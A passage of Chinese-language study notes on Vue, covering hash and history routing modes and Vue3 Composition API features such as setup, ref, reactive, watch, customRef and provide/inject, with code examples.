请求中，即：hash值不会带给服务器。</li><li>hash模式：<ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li>history模式：<ol><li>地址干净，美观 。</li><li>兼容性和hash模式相比略差。</li><li>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</li></ol></li></ol><h2 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h2><h3 id="setup配置项"><a href="#setup配置项" class="headerlink" title="setup配置项"></a>setup配置项</h3><p>与vue2不同，vue3中将data，methods等配置项都放弃，将其放入setup配置项，不再分开，而是和其他编程语言相似了，即可以在setup中指定参数和方法。组件中所用到的：数据、方法等等，均要配置在setup中，</p><p>setup函数的两种返回值：</p><ol><li>若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）</li><li><span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span></li></ol><p>setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也放可以返回一个Promise实例，但需要Suspense和异步组件的配合）</p><h3 id="ref函数"><a href="#ref函数" class="headerlink" title="ref函数"></a>ref函数</h3><ul><li>作用: 定义一个响应式的数据</li><li>语法: <code>const xxx = ref(initValue)</code> <ul><li>创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。</li><li>JS中操作数据： <code>xxx.value</code></li><li>模板中读取数据: 不需要.value，直接：<code>&lt;div&gt;&#123;&#123;xxx&#125;&#125;&lt;/div&gt;</code></li></ul></li><li>备注：<ul><li>接收的数据可以是：基本类型、也可以是对象类型（但基本不用，用reactive）。</li><li>基本类型的数据：响应式依然是靠<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>完成的。</li><li>对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— <code>reactive</code>函数。</li></ul></li></ul><h3 id="reactive函数"><a href="#reactive函数" class="headerlink" title="reactive函数"></a>reactive函数</h3><ul><li>作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用<code>ref</code>函数）</li><li>语法：<code>const 代理对象= reactive(源对象)</code>接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong></li><li>reactive定义的响应式数据是“深层次的”。</li><li>内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。</li></ul><p>要想让数据是响应式的，就必须通过ref和reactive来对数据进行操作</p><h3 id="Vue3-0中的响应式原理"><a href="#Vue3-0中的响应式原理" class="headerlink" title="Vue3.0中的响应式原理"></a>Vue3.0中的响应式原理</h3><h4 id="vue2-x的响应式"><a href="#vue2-x的响应式" class="headerlink" title="vue2.x的响应式"></a>vue2.x的响应式</h4><ul><li><p>实现原理：</p><ul><li><p>对象类型：通过<code>Object.defineProperty()</code>对属性的读取、修改进行拦截（数据劫持）。</p></li><li><p>数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'count'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token function">get</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>     <span class="token function">set</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>存在问题：</p><ul><li>新增属性、删除属性, 界面不会更新。</li><li>直接通过下标修改数组, 界面不会自动更新。</li></ul></li></ul><h4 id="Vue3-0的响应式"><a href="#Vue3-0的响应式" class="headerlink" title="Vue3.0的响应式"></a>Vue3.0的响应式</h4><ul><li><p>实现原理: </p><ul><li><p>通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。</p></li><li><p>通过Reflect（反射）:  对源对象的属性进行操作。</p></li><li><p>MDN文档中描述的Proxy与Reflect：</p><ul><li><p>Proxy：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy</a></p></li><li><p>Reflect：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token comment">// 拦截读取属性值</span>    <span class="token function">get</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">// 拦截设置属性值或添加新属性</span>    <span class="token function">set</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">// 拦截删除属性</span>    <span class="token function">deleteProperty</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> prop</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>proxy<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'tom'</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul></li></ul><h3 id="reactive对比ref"><a href="#reactive对比ref" class="headerlink" title="reactive对比ref"></a>reactive对比ref</h3><ul><li>从定义数据角度对比：<ul><li> ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。</li><li> reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。</li><li> 备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过<code>reactive</code>转为<strong style="color:#DD5145">代理对象</strong>。</li></ul></li><li>从原理角度对比：<ul><li> ref通过<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>来实现响应式（数据劫持）。</li><li> reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。</li></ul></li><li>从使用角度对比：<ul><li> ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong><code>.value</code>，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong><code>.value</code>。</li><li> reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong><code>.value</code>。</li></ul></li><li> 使用技巧：为了更多的使用更方便的reactive，一般基本类型数据会被封装在对象中再使用reactive进行数据的定义</li></ul><h3 id="setup的两个注意点"><a href="#setup的两个注意点" class="headerlink" title="setup的两个注意点"></a>setup的两个注意点</h3><ul><li><p>setup执行的时机</p><ul><li>在beforeCreate之前执行一次，this是undefined。</li></ul></li><li><p>setup的参数</p><ul><li>props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。</li><li>context：上下文对象<ul><li>attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 <code>this.$attrs</code>。</li><li>slots: 收到的插槽内容, 相当于 <code>this.$slots</code>。</li><li>emit: 分发自定义事件的函数, 相当于 <code>this.$emit</code>。</li></ul></li></ul></li></ul><p>对props和emits与用法有区别，vue3中需要给自定义事件也像props一样做一个申明接收：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">子组件，假设父组件传递了props：name，以及一个自定义事件showName&lt;template&gt;&lt;h1&gt;&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt;&lt;button @click&#x3D;showNameMethod&gt;&lt;&#x2F;button&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default&#123;        name:&#39;Demo&#39;,        props:[&#39;name&#39;],        emits：[&#39;showName&#39;],&#x2F;&#x2F;这里需要先接收自定义事件        setup(props,context)&#123;        function showNameMethod()&#123;                context.emit(&#39;hello&#39;,666)&#x2F;&#x2F;这里调用和vue2相同，调用父组件中的hello回调函数，携带参数666            &#125;        &#125;    &#125;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="computed函数"><a href="#computed函数" class="headerlink" title="computed函数"></a>computed函数</h3><ul><li><p>与Vue2.x中computed配置功能一致</p></li><li><p>写法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>computed<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//vue3现在都需要进行import，和其他编程的思想更像了</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">...</span><span class="token comment">//计算属性——简写</span>    <span class="token keyword">let</span> fullName <span class="token operator">=</span> <span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> person<span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> person<span class="token punctuation">.</span>lastName    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">//计算属性——完整</span>    <span class="token keyword">let</span> fullName <span class="token operator">=</span> <span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> person<span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> person<span class="token punctuation">.</span>lastName        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token function">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> nameArr <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>            person<span class="token punctuation">.</span>firstName <span class="token operator">=</span> nameArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            person<span class="token punctuation">.</span>lastName <span class="token operator">=</span> nameArr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="watch函数"><a href="#watch函数" class="headerlink" title="watch函数"></a>watch函数</h3><ul><li><p>与Vue2.x中watch配置功能一致</p></li><li><p>两个小“坑”：</p><ul><li>监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。</li><li>监视reactive定义的响应式数据中某个属性时：deep配置有效。</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//情况一：监视ref定义的响应式数据</span><span class="token function">watch</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'sum变化了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">immediate</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//情况二：监视多个ref定义的响应式数据</span><span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sum<span class="token punctuation">,</span>msg<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'sum或msg变化了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">/* 情况三：监视reactive定义的响应式数据若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 */</span><span class="token function">watch</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'person变化了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">immediate</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//此处的deep配置不再奏效</span><span class="token comment">//情况四：监视reactive定义的响应式数据中的某个属性</span><span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span>person<span class="token punctuation">.</span>job<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'person的job变化了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">immediate</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//情况五：监视reactive定义的响应式数据中的某些属性</span><span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span>person<span class="token punctuation">.</span>job<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span>person<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'person的job变化了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">immediate</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//特殊情况</span><span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span>person<span class="token punctuation">.</span>job<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'person的job变化了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="watchEffect函数"><a href="#watchEffect函数" class="headerlink" title="watchEffect函数"></a>watchEffect函数</h3><ul><li><p>watch的套路是：既要指明监视的属性，也要指明监视的回调。</p></li><li><p>watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。</p></li><li><p>watchEffect有点像computed：</p><ul><li>但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。</li><li>而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。这里的sum和person.age就被watch了</span><span class="token function">watchEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> x1 <span class="token operator">=</span> sum<span class="token punctuation">.</span>value    <span class="token keyword">const</span> x2 <span class="token operator">=</span> person<span class="token punctuation">.</span>age    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'watchEffect配置的回调执行了'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="生命周期-1"><a href="#生命周期-1" class="headerlink" title="生命周期"></a>生命周期</h3><ul><li>Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：<ul><li><code>beforeDestroy</code>改名为 <code>beforeUnmount</code></li><li><code>destroyed</code>改名为 <code>unmounted</code></li></ul></li><li>Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：<ul><li><code>created</code>=======&gt;<code>setup()</code></li><li><code>beforeMount</code> ===&gt;<code>onBeforeMount</code></li><li><code>mounted</code>=======&gt;<code>onMounted</code></li><li><code>beforeUpdate</code>===&gt;<code>onBeforeUpdate</code></li><li><code>updated</code> =======&gt;<code>onUpdated</code></li><li><code>beforeUnmount</code> ==&gt;<code>onBeforeUnmount</code></li><li><code>unmounted</code> =====&gt;<code>onUnmounted</code></li></ul></li></ul><p>都是通过函数的形式在setup配置项中进行使用，给其传入一个回调函数（箭头函数，箭头函数中的操作会在该生命周期中执行）</p><h3 id="自定义hook函数"><a href="#自定义hook函数" class="headerlink" title="自定义hook函数"></a>自定义hook函数</h3><ul><li><p>什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。</p></li><li><p>类似于vue2.x中的mixin。</p></li><li><p>自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。</p></li></ul><h3 id="toRef"><a href="#toRef" class="headerlink" title="toRef"></a>toRef</h3><ul><li>作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。</li><li>语法：<code>const name = toRef(person,&#39;name&#39;)</code></li><li>应用:   要将响应式对象中的某个属性单独提供给外部使用时。</li></ul><ul><li>扩展：<code>toRefs</code> 与<code>toRef</code>功能一致，但可以批量创建多个 ref 对象，语法：<code>toRefs(person)</code></li></ul><p>使用例子：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">person</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'aaa'</span><span class="token punctuation">,</span>        <span class="token literal-property property">age</span><span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">,</span>        <span class="token literal-property property">job</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">salary</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span>            <span class="token literal-property property">time</span><span class="token operator">:</span><span class="token number">8</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>            <span class="token comment">//这是不使用toRef的写法，直接将person return，但这样在模板中的语法不简洁，每一个前都需要写person</span>    <span class="token comment">//return &#123;</span>    <span class="token comment">//    person</span>    <span class="token comment">//&#125;</span>    <span class="token comment">//这是使用toRef和toRefs的语法，可以简洁模板中的语法：</span>    <span class="token keyword">return</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token function">toRef</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">salary</span><span class="token operator">:</span><span class="token function">toRef</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>job<span class="token punctuation">,</span><span class="token string">'salary'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">&#123;</span>        <span class="token operator">...</span><span class="token function">toRefs</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token comment">//这是ES6语法，在对象中要使用另一个对象，需要...将该对象展开到return的返回对象中，这样模板中就可以直接使用name,age,但salary需要job.salary</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其它-Composition-API"><a href="#其它-Composition-API" class="headerlink" title="其它 Composition API"></a>其它 Composition API</h3><h4 id="shallowReactive-与-shallowRef"><a href="#shallowReactive-与-shallowRef" class="headerlink" title="shallowReactive 与 shallowRef"></a>shallowReactive 与 shallowRef</h4><ul><li><p>shallowReactive：只处理对象最外层属性的响应式（浅响应式）。</p></li><li><p>shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。</p></li><li><p>什么时候使用?</p><ul><li> 如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===&gt; shallowReactive。</li><li> 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===&gt; shallowRef。</li></ul></li></ul><h3 id="toRaw-与-markRaw"><a href="#toRaw-与-markRaw" class="headerlink" title="toRaw 与 markRaw"></a>toRaw 与 markRaw</h3><ul><li>toRaw：<ul><li>作用：将一个由<code>reactive</code>生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。</li><li>使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。</li></ul></li><li>markRaw：<ul><li>作用：标记一个对象，使其永远不会再成为响应式对象。</li><li>应用场景:<ol><li>有些值不应被设置为响应式的，例如复杂的第三方类库等。</li><li>当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。</li></ol></li></ul></li></ul><h3 id="ustomRef"><a href="#ustomRef" class="headerlink" title="ustomRef"></a>ustomRef</h3><ul><li><p>作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。</p></li><li><p>实现防抖效果：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;template&gt;&lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keyword&quot;&gt;&lt;h3&gt;&#123;&#123;keyword&#125;&#125;&lt;&#x2F;h3&gt;&lt;&#x2F;template&gt;&lt;script&gt;import &#123;ref,customRef&#125; from &#39;vue&#39;export default &#123;name:&#39;Demo&#39;,setup()&#123;&#x2F;&#x2F; let keyword &#x3D; ref(&#39;hello&#39;) &#x2F;&#x2F;使用Vue准备好的内置ref&#x2F;&#x2F;自定义一个myReffunction myRef(value,delay)&#123;let timer&#x2F;&#x2F;通过customRef去实现自定义return customRef((track,trigger)&#x3D;&gt;&#123;return&#123;get()&#123;track() &#x2F;&#x2F;告诉Vue这个value值是需要被“追踪”的return value&#125;,set(newValue)&#123;clearTimeout(timer)timer &#x3D; setTimeout(()&#x3D;&gt;&#123;value &#x3D; newValuetrigger() &#x2F;&#x2F;告诉Vue去更新界面&#125;,delay)&#125;&#125;&#125;)&#125;let keyword &#x3D; myRef(&#39;hello&#39;,500) &#x2F;&#x2F;使用程序员自定义的refreturn &#123;keyword&#125;&#125;&#125;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="provide与inject"><a href="#provide与inject" class="headerlink" title="provide与inject"></a>provide与inject</h3><img src="https://v3.cn.vuejs.org/images/components_provide.png" style="width:300px"><ul><li><p>作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信</p></li><li><p>套路：父组件有一个 <code>provide</code> 选项来提供数据，后代组件有一个 <code>inject</code> 选项来开始使用这些数据</p></li><li><p>具体写法：</p><ol><li><p>祖组件中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">let</span> car <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'奔驰'</span><span class="token punctuation">,</span><span class="token literal-property property">price</span><span class="token operator">:</span><span class="token string">'40万'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token function">provide</span><span class="token punctuation">(</span><span class="token string">'car'</span><span class="token punctuation">,</span>car<span class="token punctuation">)</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>后代组件中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setup</span><span class="token punctuation">(</span><span class="token parameter">props<span class="token punctuation">,</span>context</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">const</span> car <span class="token operator">=</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token string">'car'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>car<span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ul><h3 id="传统-API-的缺点"><a href="#传统-API-的缺点" class="headerlink" title="传统 API 的缺点"></a>传统 API 的缺点</h3><p>使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。</p><h3 id="Composition-API-的优势"><a href="#Composition-API-的优势" class="headerlink" title="Composition API 的优势"></a>Composition API 的优势</h3><p>我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。</p><h3 id="新的组件"><a href="#新的组件" class="headerlink" title="新的组件"></a>新的组件</h3><h4 id="ragment"><a href="#ragment" class="headerlink" title="ragment"></a>ragment</h4><ul><li>在Vue2中: 组件必须有一个根标签</li><li>在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中</li><li>好处: 减少标签层级, 